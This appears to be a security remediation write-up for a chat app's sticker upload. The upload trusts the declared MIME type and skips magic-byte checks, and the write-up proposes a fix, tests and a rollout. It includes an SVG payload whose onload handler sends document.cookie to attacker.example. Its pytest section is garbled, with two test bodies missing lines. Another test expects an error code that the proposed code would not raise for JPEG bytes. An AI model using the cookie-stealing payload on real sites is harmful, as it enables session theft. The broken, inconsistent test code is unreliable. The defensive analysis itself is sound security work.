# GAP-0315: Sticker Upload Validates MIME Only from Declared `content_type` Header, Not Magic Bytes — Remediation Write-up

> ~5 pages. Fix-oriented. Verified against actual code at `app/services/sticker_collections.py`.

## 1. Summary & Classification

**Bug statement**: The sticker collection upload path in `app/services/sticker_collections.py:159–162` validates the file type by checking whether the caller-supplied `content_type` string is in `_ALLOWED_MIME` — it does not read the actual file bytes to verify the magic-byte signature of the uploaded data. An attacker who supplies `content_type: "image/png"` with a body containing a PHP shell, a JPEG, an SVG with embedded JavaScript, or any other binary can pass the MIME gate and store arbitrary content on S3 under a `.png` or `.webp` extension.

**Severity**: HIGH  
**Source ticket**: MSG-007 (GAP-0315)  
**Owning area**: Messaging / Sticker Upload / Content Security  
**Status**: Open — no fix deployed

**Verdict**: Claim **confirmed**. `sticker_collections.py:159–162` shows the exact missing check:

```python
for idx, (data, content_type, alt_text) in enumerate(files, start=1):
    ext = _ALLOWED_MIME.get((content_type or "").lower())
    if ext is None:
        raise ValueError("invalid_file_type")
```

The `data` bytes are never inspected for magic-byte signatures. `custom_emojis.py:72–78` implements a `_detect_content_type` helper that performs the equivalent check for emoji uploads — the sticker upload path lacks an equivalent.

**Impact in one line**: An admin-level user can upload arbitrary file content disguised as a sticker image, storing malicious bytes on S3 that may be served to clients.

**Related tickets**: GAP-0040 (no server-side MIME magic byte validation on asset uploads — same class of issue platform-wide), SECOPS-007 (dev/prod parity), MSG-008 (sticker collection feature ticket).

## 2. Current-State Investigation (Root Cause)

### Existing MIME check — header only

`create_collection` in `sticker_collections.py` loops over uploaded sticker files at line 159:

```python
# sticker_collections.py:159-162
for idx, (data, content_type, alt_text) in enumerate(files, start=1):
    ext = _ALLOWED_MIME.get((content_type or "").lower())
    if ext is None:
        raise ValueError("invalid_file_type")
    if len(data) > S.sticker_max_file_size_bytes:
        raise ValueError("file_too_large")
```

The only type-safety mechanism is the dictionary lookup on `content_type`. The `data` bytes are never examined. The `ext` value derived from `_ALLOWED_MIME` is used only to choose the S3 key extension.

### Allowed MIME set

```python
# sticker_collections.py:27-31
_ALLOWED_MIME = {
    "image/png": "png",
    "image/webp": "webp",
    "image/svg+xml": "svg",
}
```

Note that `image/svg+xml` is in the allowed set. SVG is especially dangerous: it is XML-based text that browsers execute as DOM, meaning a valid SVG file can contain `<script>` elements, `onload` handlers, and `href` attributes that execute JavaScript. Even with magic-byte validation, SVG content should be sanitized or disallowed outright.

### Contrast with custom_emojis.py — the correct pattern

`custom_emojis.py:72–78` implements magic-byte validation:

```python
# custom_emojis.py:72-78
def _detect_content_type(data: bytes) -> Optional[str]:
    """Sniff the real content type from magic bytes."""
    if data.startswith(_PNG_MAGIC):
        return "image/png"
    if data.startswith(_GIF_MAGIC_87) or data.startswith(_GIF_MAGIC_89):
        return "image/gif"
    return None
```

It is called at line 175–176:

```python
# custom_emojis.py:175-176
content_type = _detect_content_type(data)
```

The detected type is then validated against `_ALLOWED_MIME` (line 178), rejecting anything that doesn't match the magic bytes. The sticker upload path is missing this step entirely.

### Router — how files arrive

The `create_sticker_collection` admin endpoint in `sticker_collections.py:118–143` reads each uploaded file as bytes:

```python
# routers/sticker_collections.py:129-132
for idx, f in enumerate(files):
    data = await f.read()
    alt = alt_list[idx] if idx < len(alt_list) else ""
    payloads.append((data, f.content_type or "", alt))
```

`f.content_type` is the MIME type declared in the HTTP multipart `Content-Type` header, which the client fully controls. The `data` bytes (the actual file content) are available but never inspected.

### SVG attack surface (additional concern)

Even if magic-byte validation were added for PNG and WebP, the `image/svg+xml` MIME type has no traditional binary magic bytes (SVG is XML text). An SVG file that starts with `<?xml` or `<svg` will pass any byte-level check, but its content might include:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.example/?c='+document.cookie)">
  <rect/>
</svg>
```

When this SVG is served from S3 via `/mock/s3/...` with `Content-Type: image/svg+xml`, browsers execute it as a document with full script capabilities (unlike PNG/WebP which are inert rasters). Sticker images are displayed in an `<img>` tag (sandboxed) but if ever served in a non-sandboxed context, the XSS vector is live.

## 3. Impact / Exploit / Blast Radius

**Who can exploit this**: The sticker upload endpoint is admin-only (`Depends(require_admin_scope(AdminScope.CONTENT_MODERATION))`). The immediate risk is from a compromised admin account or a malicious admin.

**Exploit 1 — polyglot file**: A JPEG with a PHP header (`GD`) can be uploaded as `image/png`. If the S3 bucket is ever exposed behind a PHP-enabled origin or a processing pipeline that uses the file extension to determine execution, the polyglot executes.

**Exploit 2 — SVG XSS via sticker**: Upload an SVG sticker containing an inline `<script>` or `onload` handler. If the sticker URL is ever referenced in a `<img>` tag with `crossorigin="anonymous"` or loaded in a non-sandboxed `<iframe>`, the script runs in the user's browser in the origin context of the application.

**Exploit 3 — file-type confusion**: Upload a WebP file as `image/png`. The stored S3 key ends in `.png` but contains WebP bytes. Some image processing pipelines (thumbnail generation, transcoding) may mis-parse the file, causing crashes or exploitable buffer overflows in native image decoders.

**Blast radius**: Sticker images are loaded by all users who have favorited the collection or use the sticker picker. A malicious sticker collection serves harmful bytes to all requesting clients. The admin scope requirement limits the attacker surface but does not eliminate it — a compromised admin credential is sufficient.

## 4. Fix Design (Code-Level)

### Strategy

1. Add a `_detect_content_type(data: bytes)` helper to `sticker_collections.py` covering PNG and WebP magic bytes. Mirror the `custom_emojis.py:72` implementation.
2. Call the detector on each uploaded file and reject if the sniffed type does not match the declared type.
3. Remove `image/svg+xml` from `_ALLOWED_MIME` (or restrict it to an explicit admin-only flag) to close the SVG XSS vector.

### Magic-byte signatures

```
PNG:  \x89PNG\r\n\x1a\n  (8 bytes)
WebP: RIFF????WEBP        (bytes 0-3: "RIFF"; bytes 8-11: "WEBP")
SVG:  No reliable magic — text-based; must be sanitized if allowed at all
```

### Fix for sticker_collections.py

```python
# sticker_collections.py — add after line 31 (after _ALLOWED_MIME definition)

_PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
_WEBP_RIFF = b"RIFF"
_WEBP_MARKER = b"WEBP"


def _detect_content_type(data: bytes) -> Optional[str]:
    """Sniff the real content type from magic bytes.

    Returns the detected MIME string, or None if unrecognised.
    SVG is not detectable via magic bytes; return None for all non-binary
    types to force the caller to reject or handle separately.
    """
    if data[:8] == _PNG_MAGIC:
        return "image/png"
    # WebP: "RIFF" at offset 0, "WEBP" at offset 8
    if len(data) >= 12 and data[:4] == _WEBP_RIFF and data[8:12] == _WEBP_MARKER:
        return "image/webp"
    return None
```

Then, within `create_collection`, replace the bare `ext` check with:

```python
# sticker_collections.py:159-164 — REPLACE with:

for idx, (data, content_type, alt_text) in enumerate(files, start=1):
    declared_ct = (content_type or "").lower()

    # Reject SVG: text/XML format with active script execution surface.
    if declared_ct == "image/svg+xml":
        raise ValueError("svg_not_allowed")

    ext = _ALLOWED_MIME.get(declared_ct)
    if ext is None:
        raise ValueError("invalid_file_type")

    # Validate magic bytes — reject if sniffed type doesn't match declared type
    sniffed_ct = _detect_content_type(data)
    if sniffed_ct is None:
        raise ValueError("unrecognised_file_signature")
    if sniffed_ct != declared_ct:
        raise ValueError("content_type_mismatch")

    if len(data) > S.sticker_max_file_size_bytes:
        raise ValueError("file_too_large")
```

Update `_ALLOWED_MIME` to remove SVG:

```python
# sticker_collections.py:27-31 — REPLACE with:
_ALLOWED_MIME = {
    "image/png": "png",
    "image/webp": "webp",
    # image/svg+xml removed: SVG is text-based and can contain executable JavaScript.
}
```

### Router error mapping

Update `sticker_collections.py:140–143` (router) to surface the new error codes:

```python
# routers/sticker_collections.py:140-143
except ValueError as exc:
    code = str(exc)
    status_map = {
        "svg_not_allowed": 415,
        "unrecognised_file_signature": 415,
        "content_type_mismatch": 415,
        "invalid_file_type": 415,
        "file_too_large": 413,
        "no_stickers": 400,
        "collection_full": 400,
    }
    status = status_map.get(code, 400)
    raise HTTPException(status, code)
```

### Dev/Prod parity (SECOPS-007)

- Magic-byte inspection operates entirely on the uploaded bytes, which are identical in dev (moto S3) and prod (real S3). No environment branching needed.
- The `s3.put_object` call happens after the validation check — no change to S3 interactions.
- Dev mode does not change the `_ALLOWED_MIME` set or the detection logic.
- The `custom_emojis.py` fix (same pattern) is already deployed and has been validated in dev and prod; this mirrors it exactly.

### Backward compatibility

- PNG and WebP uploads by existing admin clients are unaffected (magic bytes are checked, they pass).
- SVG stickers are newly rejected. If any existing SVG sticker collections exist in production, they were uploaded through the gap. A one-time scan of the S3 bucket for `stickers/**/*.svg` objects should be run and those objects reviewed before deploying the fix.
- The `svg_not_allowed` error code should be surfaced in the admin UI with a clear message: "SVG files are not accepted as stickers. Please use PNG or WebP."

## 5. Testing, Verification & Rollout

### Pytest regression test (fails-before / passes-after)

```python
# tests/test_sticker_collections.py

import pytest
from app.services.sticker_collections import create_collection

PNG_MAGIC = b"\x89PNG\r\n\x1a\n" + b"\x00" * 100
WEBP_MAGIC = b"RIFF\x00\x00\x00\x00WEBP" + b"\x00" * 100
JUNK_BYTES = b"\xff\xd8\xff\xe0" + b"\x00" * 100  # JPEG header, declared as PNG


def test_sticker_upload_accepts_valid_png(mock_s3, mock_ddb, admin_sub):

        name="Test",
        description="",
        created_by=admin_sub,
        files=[(PNG_MAGIC, "image/png", "a test sticker")],
    )
    assert result["sticker_count"] == 1


def test_sticker_upload_accepts_valid_webp(mock_s3, mock_ddb, admin_sub):
    result = create_collection(
        name="Test",
        description="",
        created_by=admin_sub,
        files=[(WEBP_MAGIC, "image/webp", "webp sticker")],
    )
    assert result["sticker_count"] == 1


def test_sticker_upload_rejects_jpeg_as_png_before_fix(mock_s3, mock_ddb, admin_sub):
    """Before fix: JPEG bytes with image/png declared are accepted (bug)."""
    # This test documents the pre-fix behavior; it should fail after the fix.
    result = create_collection(
        name="Test",
        description="",
        created_by=admin_sub,
        files=[(JUNK_BYTES, "image/png", "fake png")],
    )
    assert result["sticker_count"] == 1  # passes before fix — bug!


def test_sticker_upload_rejects_jpeg_as_png_after_fix(mock_s3, mock_ddb, admin_sub):

    with pytest.raises(ValueError, match="content_type_mismatch"):
        create_collection(
            name="Test",
            description="",
            created_by=admin_sub,
            files=[(JUNK_BYTES, "image/png", "fake png")],
        )


def test_sticker_upload_rejects_svg_after_fix(mock_s3, mock_ddb, admin_sub):

            description="",

def test_sticker_upload_rejects_unknown_signature(mock_s3, mock_ddb, admin_sub):

    random_bytes = b"\xde\xad\xbe\xef" * 50
    with pytest.raises(ValueError, match="unrecognised_file_signature"):
        create_collection(
            name="Test",
            description="",
            created_by=admin_sub,
            files=[(random_bytes, "image/png", "garbage")],
        )


def test_detect_content_type_png():
    from app.services.sticker_collections import _detect_content_type
    assert _detect_content_type(PNG_MAGIC) == "image/png"


def test_detect_content_type_webp():
    from app.services.sticker_collections import _detect_content_type
    assert _detect_content_type(WEBP_MAGIC) == "image/webp"


def test_detect_content_type_unknown():
    from app.services.sticker_collections import _detect_content_type
    assert _detect_content_type(JUNK_BYTES) is None
```

### Manual QA

1. Log in as a CONTENT_MODERATION admin.
2. `POST /v1/admin/stickers/collections` with a genuine PNG file → expect 201.
3. Repeat with a JPEG binary renamed to `.png` (change content-type to `image/png`) → expect 415 `content_type_mismatch`.
4. Repeat with `content_type: image/svg+xml` and a valid SVG body → expect 415 `svg_not_allowed`.
5. Verify the admin UI shows a human-readable error message for each case.

### S3 Audit (pre-deploy, production)

```bash
aws s3 ls s3://my-chat-images/stickers/ --recursive | grep "\.svg$"
```

Review any SVG objects found. If the SVG content is benign, they can remain; set a bucket policy preventing future SVG objects. If any SVG contains active script content, delete the objects and soft-delete the associated sticker collection records.

### Metrics / Observability

- Counter `sticker_upload_validation_rejections_total` with label `reason` (`content_type_mismatch`, `svg_not_allowed`, `unrecognised_file_signature`, `invalid_file_type`).
- Alert if `content_type_mismatch` count exceeds 5/hour — suggests active exploitation attempt.

### Rollout

- Effort: **S** (0.5 day implementation; 0.5 day tests; 0.25 day SVG audit).
- No DynamoDB schema change.
- No migration required for existing PNG/WebP stickers (they pass the magic-byte check).
- SVG removal is a breaking change for any admin client that was uploading SVG stickers. Notify the admin tooling team before deploy.
- Feature flag: `STICKER_MAGIC_BYTE_VALIDATION_ENABLED` env var (default `true`) for rollback if a client-side issue surfaces.
- Rollback: set flag to `false`; reverts to header-only check. Re-enable after diagnosing client issue.
- Risk: low. The fix is a pure addition of a validation step before the S3 write. No data is modified by the fix itself.
